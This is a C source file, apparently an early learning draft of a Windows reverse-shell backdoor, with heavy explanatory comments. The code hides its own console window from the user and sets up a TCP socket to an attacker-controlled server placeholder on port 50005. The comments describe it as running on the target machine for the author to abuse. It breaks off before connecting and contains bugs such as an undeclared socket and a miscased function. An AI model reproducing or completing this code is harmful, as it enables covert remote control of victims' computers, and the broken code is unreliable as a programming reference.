#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>


/* 
 * Note that this all comes under the windows.h header file which is an API for interacting with windows using 
 * C and C++ functions essentially
 *
 * 
 * /


/*
 * WinMain -> entry point to a windows application, in contrast "main" would be the entry point for cmd app
 * 		also note that the WinMain function is commonly used for GUI applications for windows
 * CmdLine -> contains the command line arguments in a unicode string
 * nCmdShow -> just a flag if the main app window will be minimized maximized or shown normally
 *	
 *
 *
 */
int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow){
	// 1. Creating a console once this applicatoin runs and then hiding it from the user
	
	// HWND is an abbreviation for "Handle to a Window" which is basically a unique
	// identifier to a window in the windows OS , here we're creaitng a variable of the 
	// datatype HWND named stealth. The variable will basically store the handle to the window
	// which it will be assigned to.
	HWND stealth; // from the <windows.h> library file
	// The AllocConsole() function will just create a console window which is specific to 
	// our windows application which is just a way for the user to use the application or for us to abuse.
	// it will be a console where commands can be entered and our application will respond to those commands.
	AllocConsole(); // from the <windows.h> library file
	// so FindWindowA() is a function that will take in two parameters, the first being the class name to which the 
	// window which we want to find belongs to and the second being the name of the window which in this case
	// is NULL so we're essentially only trying to find by class name. the function will return a handle to the found
	// window and we are storing it in the stealth variable.
	stealth = FindWindowA("ConsoleWindowClass",NULL); // from the <windows.h> library file
	// now we're just showing the window, the handle of which is stored in the stealth variable and the 0 represents that 
	// we want to hide the window that window.
	showWindow(stealth,0);  // from the <windows.h> library file
	


	// Note this program is designed to run on the target machine so technically we're going to be coding
	// the client here where once this file is executed it will send out a request to the server to connect
	// declare a variable "address" of type "struct sockaddr_in" which will hold information about 
	// the server network address and port information.
	struct sockaddr_in address;
	// to store ip
	char* server_ip;
	// to sort the port
	unsigned short server_port;
	WSADATA wsaData;

	server_ip = "add ip address here";
	server_port = 50005;

	// in Windows API , "WSAStartup" is a function that initializes the 
	// Winsock libarary which is essential for networking and socket 
	// programming in windows. it provides necessary data strucutures for 
	// network communication in windows
	//
	// the MAKEWORD(2,2) represent the version of winsock requested
	// the first 2 represents the major version of Winsock 
	// the second 2 represents the minor version of Winsock
	//
	// MAKEWORD is a macro defined in Windows API for creating a 
	// 16bit word value by combining two 8-bit values. commonly used 
	// for referring to versions
	if(WSAStartup(MAKEWORD(2,0),&wsaData)!=0){
		exit(1);
	}

	// creating a socket, the socket takes in 3 parameters, 
	// AF_INET signifies this socket will be used for IPv4 Communication
	//
	// SOCK_STREAM means we're going to be using TCP for creating a connection
	//
	// 0 means we're going to be using the default protocol
	sock = socket(AF_INET,SOCK_STREAM,0);

	// preparing the "address" variable
	// memset is used to clear a memory set so in this case clear memory address "&address" with 0s
	memset(&address,0,sizeof(address));
	address.sin_family = AF_INET;
	// setting the ip address, we use inet_addr to convert string to binary network byte order.(explained below)
	address.sin_addr.s_addr = inet_addr(server_ip);
	// setting port , we use htons (host to network short) to convert the port number
	// from host byte order to network byte order
	// host byte order could be "big-endian" or "little-endian" , it's based on the architecture of the host
	// network byte order is a standardized way of transferring data between hosts, and htons will convert 
	// the server port string to "big-endian" byte order which is the standard.
	// "big-endian" most significant byte in lower address.
	// "little-endian" least significant byte in lower address.
	address.sin_port = htons(server_port);
}

